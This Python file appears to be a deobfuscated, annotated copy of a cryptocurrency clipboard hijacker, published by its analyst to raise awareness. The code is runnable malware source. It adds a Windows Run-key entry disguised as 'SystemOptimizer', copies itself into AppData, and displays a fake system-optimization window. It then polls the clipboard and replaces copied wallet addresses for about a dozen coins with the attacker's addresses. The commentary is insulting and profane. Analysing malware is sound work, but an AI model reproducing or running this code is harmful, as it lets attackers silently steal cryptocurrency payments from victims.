# Credits : Created By Unknown Attacker, Analyzed, Explained and Deobfuscated By EndReached (TeamStella)

# Explain of Original Code : This code was originally written by an attacker who created a clipboard hijacker, it was also obfuscated using base64 encoding, so i need to decode it first before i can understand the code, 
# and then i explained the code in detail with comments, and also point out some funny points and bad coding style of the attacker

# get modules
import os, sys, re, time, subprocess, threading
import warnings
import base64

# this is the code that will ignore all warnings, because the original code has a lot of warnings, and it will be annoying to see them, so just ignore them, this is just a dumb way to handle warnings, instead of fixing the warnings or something
warnings.filterwarnings('ignore')
os.environ['PYINSTALLER_NO_WARNINGS'] = '1'

# this is a simple base64 decoder, because the original code is obfuscated using base64 encoding, so i need to decode it first before i can understand the code
def decode_base64(string):
    return base64.b64decode(string).decode('utf-8')
 
# this is the code that will get tkinter module, if the module is not found, it will set is_tkinter_imported to False
try:
    import tkinter as tk
    from tkinter import ttk
    is_tkinter_imported = True
except:
    is_tkinter_imported = False

# this is attack's shit coin address, they will hijack your clipboard's coin address to one of them.
bitcoin_address = "bc1q5jahfe5s27*90uk6ewnxxxcq2h6829fyh4frms"
ethereum_address = "0x5713b16Cbb16B50E9ab965801C1a799aC6cEA525"
tron_address = "TQsejfr8WVWcohYhGWDbyHikV4jtRAuXeg"
litecoin_address = "LNAx6pkCQM281TvzKsYQUJfT9RzdzHMrhV"
binance_address = "0x5713b16Cbb16B50E9ab965801C1a799aC6cEA525"
dogecoin_address = "DRYriXbLc47zgKNrXda6dFNFWUvjCWgSa1"
usdt_trc20 = "TQsejfr8WVWcohYhGWDbyHikV4jtRAuXeg"
usdt_erc20 = "0x5713b16Cbb16B50E9ab965801C1a799aC6cEA525"
solana_address = "95R3hkaWGh114bmhfKMxxojpcas2u3CbdU4Ny44Frin8"
polygon_address = "0x5713b16Cbb16B50E9ab965801C1a799aC6cEA525"
ripple_address = "r3YY+r2piDPVW64ZV9CHmhCnrVnJyazmor"
ada_address = "addr1qy0sv438zffkxtvyw5dqkmlzlqqh4y7uhk6ld43zctcjdhglqetzwyjnvvkcgag6pdh797qp02fae0d47mtz9sh3ymws57q9s7"

def register_to_registry():
    try:
        # if it's windows
        if os.name == "nt":
            import winreg, ctypes
            # get appdata path, for example if the user is "User", then appdata path will be "C:\\Users\\User\\AppData\\Roaming"
            appdata_path = os.getenv("APPDATA")
            # get arguments of the script, it is the file name of the script, for example if the script is running as "C:\\Users\\User\\Desktop\\script.exe", then arguments will be "C:\\Users\\User\\Desktop\\script.exe"
            arguments = sys.argv[0]
            
            # if script is running as .exe
            if sys.argv[0].endswith(".exe"):
                # generate the path with escape sequence, it is combined with appdata path and two escape sequence, for example if the script is running as "C:\\Users\\User\\Desktop\\script.exe", then
                appdata_path_with_escape_seq = os.getenv("APPDATA") + "\\"
                # generate the path that will be used to hide the script, it is combined with appdata path and the file name of the script, for example if the script is running as "C:\\Users\\User\\Desktop\\script.exe", then
                path_to_hide = appdata_path_with_escape_seq + os.path.basename(sys.argv[0]) 
                # explained: os.path.basename(sys.argv[0]) means get the file name of the script, for example if sys.argv[0] is "C:\\Users\\User\\Desktop\\script.exe", os.path.basename(sys.argv[0]) will return "script.exe"
                # so this code will generate root path like "C:\\Users\\User\\AppData\\Roaming\\script.exe", because it is combined with appdata_path_with_escape_seq which is "C:\\Users\\User\\AppData\\Roaming\\"
                
                # if the script is running in exist path
                if os.path.exists(sys.argv[0]):
                    try:
                        import shutil
                        # check if the file is already exist in appdata, if not then copy the file to appdata
                        if not os.path.exists(path_to_hide):
                            # copy the file to appdata and keep the original file's metadata, for example the creation time, modification time, etc.
                            shutil.copy2(sys.argv[0], path_to_hide)
                        file_path = "\"" + path_to_hide + "\""
                    # if there is any error while copying the file, for example permission error, then just use the original file path
                    except Exception:
                        file_path = "\"" + sys.argv[0] + "\""
                # if the script isn't running in exists path
                else:
                    file_path = "\"" + sys.argv[0] + "\""
            # this case is not file is executing as .exe, it means it is executing as .py, so the attacker will execute the script with python interpreter
            else:
                file_path = os.getenv("LOCALAPPDATA") + "\\Programs\\Python\\Launcher\\py.exe" + " " + "-i" + " " + "\"" + appdata_path + "\\\\" + arguments + "\""
                # by the way, i can make this code more readable like this: file_path = os.getenv("LOCALAPPDATA") + "\\Programs\\Python\\Launcher\\py.exe" + f" -i \"{appdata_path}\\\\{arguments}\"" but i don't do that, 
                # because i want to keep the code as close as possible to the original code, and the original code is obfuscated, so it is not very readable, but it is what it is.
            
            # nothing to comment, it is just the registry key that it will set the value to, it is HKEY_CURRENT_USER
            hkey_current_user = winreg.HKEY_CURRENT_USER
            # dynamic registry key path to Run key, it is SOFTWARE\Microsoft\Windows\CurrentVersion\Run, this is the registry key that will execute the command when the user log in to windows
            run_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            # explained: CreateKeyEx funtion's args are (key, sub_key, reserved, access), so this code is creating a registry key in HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run with write access, and the reserved value is 0, it is not used.
            full_registry_path = winreg.CreateKeyEx(hkey_current_user, run_path, 0, winreg.KEY_WRITE)

            # set value to the registry key, the value name is "SystemOptimizer", the value type is REG_SZ which means string, and the value data is file_path which is the executable path of the script
            # funny point: the value name "SystemOptimizer" is just a random name, it doesn't have any meaning, it is just used to make the registry key look more legit, so the user won't notice it, but in reality it is just a random name that the attacker choose.
            # funny point 2: SetValueEx without any error handling? is the attacker really that confident that this code will never fail? honestly this is just a sign of bad coding and vibe coding, this the attacker really know how to code?
            winreg.SetValueEx(full_registry_path, "SystemOptimizer", 0, winreg.REG_SZ, file_path)
            full_registry_path.Close()
            
            # else, code is not running as .exe, it means it is running as .py, so the attacker will copy the script to appdata and then execute it from there, this is just a dumb way to do it, instead of using shutil.copy2 like in the previous code
            if not sys.argv[0].endswith(".exe"):
                # _v0x1 is the list that will store the lines of the script's own source code, and then write it to the new file in appdata, this is just a dumb way to copy the file, instead of using shutil.copy2 like in the previous code, but hey, it works
                file_data_list = []
                try:
                    # open the script's own source code and read it line by line
                    # funny point: the attacker is reading the script's own source code and then write it to the new file in appdata, this is just a dumb way to copy the file, instead of using shutil.copy2 like in the previous code, but hey, it works
                    # funny point 2: the attacker is reading the file with utf-8 encoding and ignore errors, this is just a dumb way to read the file, because if there is any non-utf-8 character in the file, it will be ignored and lost
                    with open(sys.argv[0], 'r', encoding='utf-8', errors='ignore') as file_handle:
                        file_data = file_handle.readlines()
                        for file_data_lines in file_data:
                            file_data_list.append(file_data_lines)
                
                # end's comment: why the attacker is catching both UnicodeDecodeError and IOError? is the attacker really that paranoid that they think there will be an error while reading the file? and why throwing nothing?
                # if there is an error while reading the file, it means the file is not readable, so it can't copy it to appdata, why do "return" instead of exit? such of shit vibe coders...
                except (UnicodeDecodeError, IOError):
                    return
                
                # appdata path with two escape sequnce
                # funny point: this virus defined appdata path, why still use os.getenv("APPDATA") instead of appdata_path? really shit vibe coder...
                appdata_path_with_two_escape_seq = os.getenv("APPDATA") + "\\\\"
                # path for hide app at appdata
                # end's comment: ayo fucking you defined appdata_path_with_two_escape_seq idiot! why same code?
                path_to_hide = os.getenv("APPDATA") + "\\\\" + os.path.basename(sys.argv[0])

                try:
                    # open path_to_hide file
                    # end's comment: fucking copy file and write it! it's the most suck code ever!
                    with open(path_to_hide, 'w', encoding='utf-8', errors='ignore') as file_handle:
                        for file_data_lines in file_data_list:
                            file_handle.write(file_data_lines)
                            # if the line is "FirstTime = True\n", replace it with "FirstTime = False\n"
                            if file_data_lines == "FirstTime = True\n":
                                file_handle.write("FirstTime = False\n")
                # funny point: this code will catch any error while writing the file, for example permission error, disk full error, etc, but it will just pass and do nothing, this is just a dumb way to handle errors, instead of logging the error or something
                except Exception:
                    pass
    # if it's not windows, just pass, because the script is designed to run only on windows, so there is no need to do anything if it's not windows
    except Exception:
        pass


class Hijacker_Main:
    def __init__(self):
        # these are the regex patterns that will be used to match the clipboard content, if the clipboard content matches one of these patterns, it means the clipboard content is a coin address, and then it will replace the clipboard content with the attacker's coin address
        self.bitcoin = r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^(bc1)[0-9a-zA-HJ-NP-Z]{11,71}$'
        self.ethereum = r'^0x[a-fA-F0-9]{40}$'
        self.tron = r'^T[A-Za-z1-9]{33}$'
        self.litecoin = r'^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$|^(ltc1)[0-9a-z]{58,72}$'
        self.binance = r'^0x[a-fA-F0-9]{40}$|^bnb[a-z0-9]{38}$'
        self.dogecoin = r'^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$'
        self.solana = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
        # this is same regex pattern as ethereum
        # end's comment: Idiot coder, why you define same regex pattern for two different coins? just use one variable for both coins
        self.ethereum_erc_20 = r'^0x[a-fA-F0-9]{40}$'
        self.ripple = r'^r[1-9A-HJ-NP-Za-km-z]{25,35}$'
        self.ada = r'^(addr1)[0-9a-z]{98,110}$|^(addr)[0-9a-z]{98,110}$'
        
        # this is the mapping of coin name to the attacker's coin address, for example "btc" is mapped to bitcoin_address, "eth" is mapped to ethereum_address, etc, this mapping will be used to replace the clipboard content with the attacker's coin address
        # end's comment: this mapping is just a dumb way to store the coin name and the attacker's coin address, instead of using a class or something
        self.address_map = {
            "btc": bitcoin_address,
            "eth": ethereum_address,
            "trx": tron_address,
            "ltc": litecoin_address,
            "bnb": binance_address,
            "doge": dogecoin_address,
            "sol": solana_address,
            "poly": polygon_address,
            "ripple": ripple_address,
            "ada": ada_address,
            "usdt_trc20": usdt_trc20 if usdt_trc20 else tron_address,
            "usdt_erc20": usdt_erc20 if usdt_erc20 else ethereum_address
        }
        # this is the code that will import pyperclip module, if the module is not found, it will try to install it using pip and then restart the script, this is just a dumb way to handle missing module, instead of using a proper error handling or something
        try:
            # funny point: the attacker is importing pyperclip module in the __init__ method of the class, this means every time an instance of the class is created, it will try to import pyperclip module, this is just a dumb way to do it, instead of importing it at the top of the script
            global pyperclip
            import pyperclip
        except ModuleNotFoundError:
            try:
                # funny point: the attacker is trying to install pyperclip module using pip, but they are not using subprocess to run the pip command, instead they are using os.system which is just a dumb way to do it, 
                # because it will open a new console window and show the pip installation process, which can be noticed by the user, instead of using subprocess which can run the command in background without showing any window
                os.system("pip install pyperclip")
                # after install the module, it will restart the script
                os.execl(sys.executable, sys.executable, *sys.argv)
            # end's comment: why the attacker is not resolve a specific exception here? is the attacker really that paranoid that they think there will no be an error while installing the module? and why throwing restart?
            except Exception:
                os.execl(sys.executable, sys.executable, *sys.argv)

    # this is the function that will read the clipboard content and check if it matches one of the regex patterns, if it matches, it will return the coin name, for example "btc", "eth", etc, if it doesn't match any pattern, it will return "nil"
    # end's comment: this function is just a dumb way to check the clipboard content, instead of using a proper error handling or something, and it is also not very efficient because it will check the clipboard content against all the regex patterns every time, even if the clipboard content is not changed, it will still check it, which is just a waste of resources
    def get_coin_type(self):
        try:
            # get clipboard content and remove leading and trailing whitespace, this is the code that will read the clipboard content and check if it matches one of the regex patterns, if it matches, it will return the coin name, for example "btc", "eth", etc,
            # if it doesn't match any pattern, it will return "nil"
            clipboard_value = pyperclip.paste().strip()
            
            if re.match(self.ada, clipboard_value):
                return "ada"
            elif re.match(self.bitcoin, clipboard_value):
                return "btc"
            elif re.match(self.tron, clipboard_value):
                return "trx"
            elif re.match(self.ripple, clipboard_value):
                return "ripple"
            elif re.match(self.litecoin, clipboard_value):
                return "ltc"
            elif re.match(self.dogecoin, clipboard_value):
                return "doge"
            elif re.match(self.solana, clipboard_value) and len(clipboard_value) >= 32 and len(clipboard_value) <= 44:
                return "sol"
            elif re.match(self.ethereum, clipboard_value):
                return "eth"
            return "nil"
        except Exception:
            return "nil"
    # this is the function that will hijack the clipboard content, it will call get_coin_type function to check the clipboard content, if it returns a coin name, it will replace the clipboard content with the attacker's coin address, if it returns "nil", it will do nothing
    # end's comment: this function is really just a dumb way to hijack the clipboard content, it copies the attacker's coin address and don't remove original clipboard content, seriously, this virus' code is really sucks!
    def hijack(self):
        detected_coin = self.get_coin_type().strip()
        try:
            # check if the detected coin is in the address map, if it is, it will get the attacker's coin address from the address map and copy it to the clipboard, if the address is empty, it will do nothing
            if detected_coin in self.address_map:
                address = self.address_map[detected_coin]
                if address:
                    # if address is in the address map, it will copy the address to the clipboard, this is the code that will hijack the clipboard content, it will replace the clipboard content with the attacker's coin address
                    pyperclip.copy(address)
        except Exception:
            pass

# this is the function that will create a window that shows the optimization process, it will show a progress bar and some text that changes every few seconds
# end's comment: this function is just a dumb way to notify the user that the system is being optimized, even a 2-year-old kid knows that this is just a fake optimization process. and nobody will use this "Untrusted" file, because they'll use avast or something else to optimize their system
# funny point: why it is not hiding itself? it want to show  "we are hijacking your clipboard content, but we are optimizing your system (but don't worry we are not optimizing), do you want to see the optimization?" even a 2-year-old kid doesn't believe this
def show_window():
    # if tkinter module is not imported
    if not is_tkinter_imported:
        return
    
    # create a window using the tkinter module, this is the code that will create a window that shows the optimization process, it will show a progress bar and some text that changes every few seconds
    main_window = tk.Tk()
    # this is the code that will set the title of the window to "System Optimization", set the size of the window to 400x200, make the window not resizable, and set the window to be always on top of other windows
    main_window.title("System Optimization")
    main_window.geometry("400x200")
    main_window.resizable(False, False)
    main_window.attributes("-topmost", True)
    
    # get some screen information to center the window on the screen
    screen_width = main_window.winfo_screenwidth() // 2 - 200
    screen_height = main_window.winfo_screenheight() // 2 - 100
    main_window.geometry(f"400x200+{screen_width}+{screen_height}")
    
    # this is the code that will create a frame in the window, and then add some labels and a progress bar to the frame
    window_frame = tk.Frame(main_window, bg="#2b2b2b")
    window_frame.pack(fill=tk.BOTH, expand=True)
    
    # this is the code that will create a label that shows the text "Optimizing System..."
    label1 = tk.Label(window_frame, text="Optimizing System...", font=("Arial", 14), bg="#2b2b2b", fg="white")
    label1.pack(pady=30)
    
    # this is the code that will create a progress bar that shows the optimization proceess
    progress_bar = ttk.Progressbar(window_frame, mode="indeterminate", length=300)
    progress_bar.pack(pady=20)
    progress_bar.start(10)
    
    # this is the code that will create a label that shows the text "Scanning system files...", and then it will change the text every few seconds to show the optimization process
    label2 = tk.Label(window_frame, text="Scanning system files...", font=("Arial", 10), bg="#2b2b2b", fg="#aaaaaa")
    label2.pack(pady=10)
    
    # fake texts that will be shown in the label, it will change every few seconds to show the optimization process
    texts_list = [
        "Scanning system files...",
        "Optimizing registry...",
        "Cleaning unnecessary files...",
        "Improving system performance...",
        "Optimization almost complete..."
    ]

    # this is the code that will change the text in the label every few seconds to show the optimization process
    def update_texts():
        # this code will loop through the texts list and change the text in the label every few seconds, after it finishes changing the text, it will wait for a few seconds and then close the window
        # end's comment: why there's an unused variable in the for loop? is the attacker really that bad at coding that they don't know how to use loop? 
        # and also, that unused variable is named by me but the original code has no differeces(_i0x1), so i just rename it to "unused", because the original code is obfuscated, so it is not very readable, but it is what it is.
        for unused, text in enumerate(texts_list):
            label2.config(text=text)
            main_window.update()
            time.sleep(2)
        time.sleep(1)
        # after all, it will close the window, this is the code that will close the window after the optimization process is complete
        main_window.destroy()
    
    # threading with daemon=True so it will automatically close when the main thread is closed, this is the code that will run the update_texts function in a separate thread so it won't block the main thread that runs the window
    threading.Thread(target=update_texts, daemon=True).start()
    
    # this is the code that will run the main loop of the window, this is the code that will show the window and keep it open until it is closed by the user or by the update_texts function
    main_window.mainloop()

def main():
    # if the script is running without any arguments
    if len(sys.argv) == 1:
        try:
            # if the script is running on posix(Portable Operating System Interface) system, it will run the script in background using subprocess.Popen

            # arguments explained: [sys.executable] is the path of the python interpreter, for example "C:\\Python39\\python.exe", \
            # [sys.argv[0]] is the file name of the script, for example "script.py", 
            # and sys.argv[1:] is the list of arguments passed to the script, for example ["arg1", "arg2"], so when we combine them together, it will be ["C:\\Python39\\python.exe", "script.py", "bg", "arg1", "arg2"]
            # stdout is redirected to suboprocess.DEVNULL which means it will discard any output that the script tries to print to the console, 
            # and stderr is redirected to subprocess.STDOUT which means it will also discard any error messages that the script tries to print to the console,
            #  so the user won't see any output or error messages from the script

            if os.name == "posix":
                # explained: subprocess.Popen function's args are (args, bufsize, executable, stdin, stdout, stderr, preexec_fn, close_fds, shell, cwd, env, universal_newlines, startupinfo, creationflags), so this code will run the script 
                # in background using subprocess.Popen with the same arguments as the original script but with "bg" argument added to it, and it will close the file descriptors and redirect the stdout and stderr to devnull so it won't show any output in the console
                # how it will get some arguments of the original script? it will get the arguments from sys.argv, and then add "bg" argument to it, so if the original script is running as "python script.py arg1 arg2", then the new arguments will be "python script.py bg arg1 arg2"
                subprocess.Popen([sys.executable] + [sys.argv[0], "bg"] + sys.argv[1:],
                                 close_fds=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            elif os.name == "nt":
                # if the script is running on windows, it will show the optimization window and then register the script to the registry so it will run every time the user log in to windows, 
                # and then it will run the script in background using subprocess.Popen with the same arguments as the original script but with "bg" argument added to it,
                #  and it will redirect the stdout and stderr to devnull so it won't show any output in the console
                if is_tkinter_imported:
                    show_window()
                register_to_registry()
                subprocess.Popen([sys.executable] + [sys.argv[0], "bg"] + sys.argv[1:],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        # if there is any error while running the script in background, it will just pass and do nothing
        # end's comment: why the attacker is STILL doesn't catch a specific exception here? is the attacker really that paranoid that they think there will be no error while running the script in background? the hell...
        except Exception:
            pass
        sys.exit(0)

# call main function to run the script
main()
# this is the main loop that will create an instance of the Hijacker_Main class and call the hijack function every 0.5 seconds to check the clipboard content and replace it if it matches one of the coin address patterns
while True:
    # get an instance of the Hijacker_Main class, this is the code that will create an instance of the Hijacker_Main class, which will initialize the regex patterns and the address map, and also import the pyperclip module
    hijacker = Hijacker_Main()
    # execute the hijack function to check the clipboard content and replace it if it matches one of the coin address patterns, 
    # this is the code that will call the hijack function every 0.5 seconds to check the clipboard content and replace it if it matches one of the coin address patterns
    hijacker.hijack()
    # this is the code that will sleep for 0.5 seconds before checking the clipboard content again, this is just to prevent the script from using too much CPU resources by checking the clipboard content too frequently,
    # and also to make it less noticeable by the user, because if it checks the clipboard content every second or something, it might cause some lag or something, but with 0.5 seconds, it is less likely to cause any noticeable lag or something
    # end's comment: why the attacker is using time.sleep(0.5)? attacker can use a more efficient way to check the clipboard content, for example using a clipboard listener or something, 
    # instead of using an infinite loop with time.sleep, which is just a dumb way to do it, but hey, it works, even if it is really bad, but it is what it is.
    time.sleep(0.5)

# Short review: This code is a clipboard hijacker that will replace any cryptocurrency address copied to the clipboard with the attacker's address.
# It also has a fake optimization window that will show when the script is run without any arguments. The code is really bad and full of dumb ways to do things, but it works, even if it is really bad, but it is what it is.
# so we (endreached only) TeamStella decided to publish this code to github to raise awareness about clipboard hijackers and how they work, and also to show how bad the coding style of the attacker is, but it is what it is.